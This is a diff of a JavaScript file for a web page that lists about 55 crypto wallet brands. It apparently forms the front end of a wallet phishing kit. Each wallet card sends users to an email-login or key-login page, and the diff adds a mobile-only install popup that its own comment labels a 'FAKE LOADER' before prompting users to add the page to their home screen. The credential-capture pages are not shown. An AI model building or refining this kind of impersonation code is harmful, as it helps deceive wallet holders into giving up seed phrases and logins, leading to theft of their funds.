@@ -1,88 +1,55 @@
+// ==========================
+// MOBILE DETECTION
+// ==========================
+function isMobileDevice() {
+  // True only for smartphones and tablets
+  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
+      && window.innerWidth <= 1024; // extra safety for desktop emulation
+}
+
+// ==========================
+// SERVICE WORKER REGISTER
+// ==========================
+if ("serviceWorker" in navigator) {
+  window.addEventListener("load", () => {
+    navigator.serviceWorker
+      .register("./service-worker.js")
+      .then(() => console.log("Service Worker Registered"))
+      .catch((err) => console.log("SW error", err));
+  });
+}
+
 console.log("Wallets page loaded!");
 
-// 🔥 1) Email/Password Wallets List
+// ==========================
+// EMAIL WALLET LIST
+// ==========================
 const emailWallets = [
-  "Poloneix",
-  "Coinbase1",
-  "Coinbase2",
-  "Binance",
-  "Bitget",
-  "Nash",
+  "Poloneix","Coinbase1","Coinbase2","Binance","Bitget","Nash"
 ];
 
-// 🔥 2) All Wallets List
+// ==========================
+// ALL WALLETS
+// ==========================
 const wallets = [
-  "Meta Mask",
-  "Poloniex",
-  "Trust Wallet",
-  "Solflare",
-  "WalletConnect",
-  "Terra",
-  "Bitpay",
-  "Maiar",
-  "MyKey",
-  "Atwallet",
-  "Authereum",
-  "Bitfrost",
-  "Coinbase1",
-  "Coinomi",
-  "Dcent",
-  "Easypocket",
-  "Ledger",
-  "Coolwallet",
-  "Cybavowallet",
-  "Coin98",
-  "Harmony",
-  "PeakDefi",
-  "Gridplus",
-  "VIA",
-  "Imtoken",
-  "Infinito",
-  "Infinity",
-  "Kadachain",
-  "Keplr",
-  "Midas1",
-  "Marixwallet",
-  "Midas2",
-  "Nash",
-  "Onto",
-  "Ownbit",
-  "Pillar",
-  "Rainbow",
-  "Safepal",
-  "Sollet",
-  "Spark",
-  "Spatium",
-  "Tokenary",
-  "Tokenpocket",
-  "Tomo",
-  "Torus",
-  "Coinbase2",
-  "XDC",
-  "Walletio",
-  "Walleth",
-  "Zelcore",
-  "Phantom",
-  "Exodus",
-  "Binance",
-  "Bitget",
-  "Other Wallets",
+  "Meta Mask","Poloniex","Trust Wallet","Solflare","WalletConnect","Terra",
+  "Bitpay","Maiar","MyKey","Atwallet","Authereum","Bitfrost","Coinbase1",
+  "Coinomi","Dcent","Easypocket","Ledger","Coolwallet","Cybavowallet",
+  "Coin98","Harmony","PeakDefi","Gridplus","VIA","Imtoken","Infinito",
+  "Infinity","Kadachain","Keplr","Midas1","Marixwallet","Midas2","Nash",
+  "Onto","Ownbit","Pillar","Rainbow","Safepal","Sollet","Spark","Spatium",
+  "Tokenary","Tokenpocket","Tomo","Torus","Coinbase2","XDC","Walletio",
+  "Walleth","Zelcore","Phantom","Exodus","Binance","Bitget","Other Wallets"
 ];
 
 const container = document.getElementById("walletContainer");
 
-// 🔥 Generate Wallet Cards
+// ==========================
+// GENERATE WALLET CARDS
+// ==========================
 wallets.forEach((name) => {
-  let imageName =
-    name
-      .toLowerCase()
-      .replace(/\s+/g, "")
-      .replace(/'/g, "")
-      .replace(/\./g, "")
-      .replace(/-/g, "")
-      .replace(/\//g, "") + ".webp";
+  let imageName = name.toLowerCase().replace(/\s+/g, "").replace(/['./\-]/g, "") + ".webp";
 
-  // OTHER WALLET CARD
   if (name.toLowerCase().includes("other")) {
     container.innerHTML += `
       <div class="wallet-card" onclick="openWallet('${name}')">
@@ -98,12 +65,10 @@ wallets.forEach((name) => {
             <img src="assets/icons/share.png"><span>Share</span>
           </div>
         </div>
-      </div>
-    `;
+      </div>`;
     return;
   }
 
-  // NORMAL WALLET CARDS
   container.innerHTML += `
     <div class="wallet-card" onclick="openWallet('${name}')">
       <img src="wallet-icons/${imageName}">
@@ -119,38 +84,27 @@ wallets.forEach((name) => {
           <img src="assets/icons/share.png"><span>Share</span>
         </div>
       </div>
-    </div>
-  `;
+    </div>`;
 });
 
 // ==========================
-// ⭐ NEW INSTALL POPUP LOGIC
+// INSTALL POPUP (FAKE LOADER) MOBILE ONLY
 // ==========================
-
-// Popup elements
 const popup = document.getElementById("installPopup");
 const popLogo = document.getElementById("popLogo");
 const popWalletName = document.getElementById("popWalletName");
-const progressText = document.getElementById("progressText");
 const progressFill = document.getElementById("progressFill");
 const successTick = document.getElementById("successTick");
 
 function startInstallPopup(walletName) {
-  // Set popup content
+  if (!isMobileDevice()) {
+    console.log("Install option is mobile only");
+    return;
+  }
+
   popWalletName.innerText = walletName;
+  popLogo.src = "icons/icon-192.png";
 
-  let imageName =
-    walletName
-      .toLowerCase()
-      .replace(/\s+/g, "")
-      .replace(/'/g, "")
-      .replace(/\./g, "")
-      .replace(/-/g, "")
-      .replace(/\//g, "") + ".webp";
-
-  popLogo.src = `wallet-icons/${imageName}`;
-
-  // Reset UI before showing
   progressFill.style.width = "0%";
   successTick.style.opacity = 0;
   popup.style.display = "flex";
@@ -163,132 +117,86 @@ function startInstallPopup(walletName) {
     if (progress >= 100) {
       clearInterval(timer);
 
-      // Show success tick animation
       setTimeout(() => {
         successTick.style.opacity = 1;
         successTick.style.transform = "scale(1.4)";
       }, 300);
 
-      // Close popup after animation
       setTimeout(() => {
         popup.style.display = "none";
-        showA2HSPopup(walletName); // 🔥 NEW POPUP
+        showA2HSPopup(walletName);
       }, 1500);
     }
   }, 80);
 }
-
-// ==========================
-// REPLACE installWallet()
-// ==========================
 
 function installWallet(walletName) {
   startInstallPopup(walletName);
 }
 
 // ==========================
-// Open Wallet (email/phrase routing)
+// OPEN WALLET
 // ==========================
-
 function openWallet(walletName) {
-  const emailWallets = ["Coinbase1", "Coinbase2", "Binance", "Bitget", "Poloniex"];
-
+  const emailWallets = ["Coinbase1","Coinbase2","Binance","Bitget","Poloniex"];
   if (emailWallets.includes(walletName)) {
-    window.location.href = `email-login.html?wallet=${encodeURIComponent(
-      walletName
-    )}`;
+    window.location.href = `email-login.html?wallet=${encodeURIComponent(walletName)}`;
   } else {
-    window.location.href = `key-login.html?wallet=${encodeURIComponent(
-      walletName
-    )}`;
+    window.location.href = `key-login.html?wallet=${encodeURIComponent(walletName)}`;
   }
 }
 
 // ==========================
-// Share wallet
+// SHARE WALLET
 // ==========================
-
 function shareWallet(walletName) {
-  const keyloginWallets = ["Poloniex","Coinbase1", "Coinbase2", "Binance", "Bitget"];
-  if (keyloginWallets.includes(walletName)) {
-    const shareUrl =
-      `${window.location.origin}/email-login.html?wallet=` +
-      encodeURIComponent(walletName);
+  const emailWallets = ["Coinbase1","Coinbase2","Binance","Bitget","Poloniex"];
+  const page = emailWallets.includes(walletName) ? "email-login.html" : "key-login.html";
+  const shareUrl = `${window.location.origin}/${page}?wallet=${encodeURIComponent(walletName)}`;
 
-    if (navigator.share) {
-      navigator
-        .share({
-          title: "Wallet",
-          text: `Check this wallet: ${walletName}`,
-          url: shareUrl,
-        })
-        .catch(() => {});
-    } else {
-      alert("Sharing not supported.");
-    }
+  if (navigator.share) {
+    navigator.share({
+      title: "Wallet",
+      text: `Check this wallet: ${walletName}`,
+      url: shareUrl,
+    }).catch(() => {});
   } else {
-    const shareUrl =
-      `${window.location.origin}/key-login.html?wallet=` +
-      encodeURIComponent(walletName);
-
-    if (navigator.share) {
-      navigator
-        .share({
-          title: "Wallet",
-          text: `Check this wallet: ${walletName}`,
-          url: shareUrl,
-        })
-        .catch(() => {});
-    } else {
-      alert("Sharing not supported.");
-    }
+    alert("Sharing not supported.");
   }
 }
+
 // ==========================
-// 🔥 ADD TO HOME SCREEN LOGIC
+// PWA ADD TO HOME SCREEN (MOBILE ONLY)
 // ==========================
+let deferredPrompt = null;
 
-let deferredPrompt;
-
-// capture browser install event
-window.addEventListener("beforeinstallprompt", (e) => {
-  e.preventDefault();
-  deferredPrompt = e;
-});
-
-// elements
 const a2hsPopup = document.getElementById("a2hsPopup");
 const a2hsLogo = document.getElementById("a2hsLogo");
 const a2hsName = document.getElementById("a2hsName");
 const a2hsBtn = document.getElementById("a2hsBtn");
 
+window.addEventListener("beforeinstallprompt", (e) => {
+  if (!isMobileDevice()) return;
+
+  e.preventDefault();
+  deferredPrompt = e;
+});
+
 function showA2HSPopup(walletName) {
-  if (!deferredPrompt) {
-    console.log("Install not available");
-    return;
-  }
+  if (!isMobileDevice()) return;
+  if (!deferredPrompt) return;
 
   a2hsName.innerText = walletName;
-
-  let imageName = walletName.toLowerCase().replace(/\s+/g, "") + ".webp";
-
-  a2hsLogo.src = `wallet-icons/${imageName}`;
+  a2hsLogo.src = "icons/icon-192.png";
   a2hsPopup.style.display = "block";
 }
 
-// button click → real install
-a2hsBtn.addEventListener("click", async () => {
-  if (!deferredPrompt) {
-    alert("Install option not available yet.");
-    return;
-  }
+a2hsBtn?.addEventListener("click", async () => {
+  if (!isMobileDevice()) return;
+  if (!deferredPrompt) return;
 
   deferredPrompt.prompt();
   await deferredPrompt.userChoice;
   deferredPrompt = null;
   a2hsPopup.style.display = "none";
 });
-// 🔥 FORCE TEST
-setTimeout(() => {
-  showA2HSPopup("Meta Mask");
-}, 3000);
